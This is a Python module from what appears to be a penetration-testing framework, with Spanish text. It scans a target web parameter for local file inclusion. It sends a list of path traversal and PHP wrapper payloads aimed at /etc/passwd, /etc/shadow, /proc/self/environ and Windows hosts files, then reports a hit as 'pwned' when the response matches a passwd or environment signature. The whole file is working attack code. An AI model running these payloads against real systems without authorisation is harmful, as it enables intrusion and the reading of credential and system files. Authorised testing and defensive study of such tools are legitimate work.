# scripts/http/attack/lfi_detect.py
import urllib.request, urllib.error, urllib.parse, re
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

LFI_PAYLOADS = [
    "../etc/passwd","../../etc/passwd","../../../etc/passwd",
    "../../../../etc/passwd","../../../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd","..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd","....//....//etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "/proc/self/environ","/proc/version","/etc/shadow",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_INDICATORS = [
    r"root:x:0:0", r"root:.*:/bin/", r"\[boot loader\]",
    r"DOCUMENT_ROOT=", r"Linux version \d",
]

class Script(BaseScript):
    name        = "lfi-detect"
    protocol    = "http"
    category    = "attack"
    description = "Detección de Local File Inclusion: path traversal y wrappers PHP en parámetros de fichero."

    EXAMPLES = [
        {"flag": "--param", "desc": "Parámetro vulnerable (ej: file, page, include)",
         "good": "http --script=lfi-detect -t 10.10.10.5 --path /index.php --param page",
         "bad":  "http --script=lfi-detect (usa param 'file' por default)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 80)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        param   = kwargs.get("param") or "file"
        ip      = self.target.ip
        base    = f"http://{ip}:{port}"
        findings = []

        for payload in LFI_PAYLOADS:
            url = f"{base}{path}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                try:
                    resp = urllib.request.urlopen(req, timeout=timeout)
                    body = resp.read(65536).decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    body = e.read(65536).decode("utf-8", errors="replace") if e else ""
                for indicator in LFI_INDICATORS:
                    if re.search(indicator, body, re.I):
                        findings.append((payload[:60], indicator))
                        session_db.save_finding(ip, "HTTP", "lfi_detected",
                                                f"param={param} payload={payload[:40]}")
                        print_result("HTTP", ip, "pwned", f"LFI: {payload[:40]}")
                        break
            except Exception:
                pass

        if findings:
            print_table(f"LFI — {ip}:{port}{path}?{param}", ["Payload", "Indicador"], findings)
        else:
            print_check(f"Sin LFI en '{param}'", ok=True)

        return findings
